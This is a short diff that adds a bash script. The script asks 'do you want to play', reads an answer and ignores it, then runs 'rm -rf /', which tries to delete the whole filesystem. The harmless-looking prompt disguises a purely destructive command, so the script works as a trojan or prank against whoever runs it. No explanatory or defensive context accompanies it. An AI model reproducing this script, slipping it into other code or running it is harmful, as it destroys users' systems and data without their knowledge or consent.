@@ -1,0 +1,7 @@
+#!/bin/bash
+
+echo do you want to play
+
+read ANSWER
+
+rm -rf /
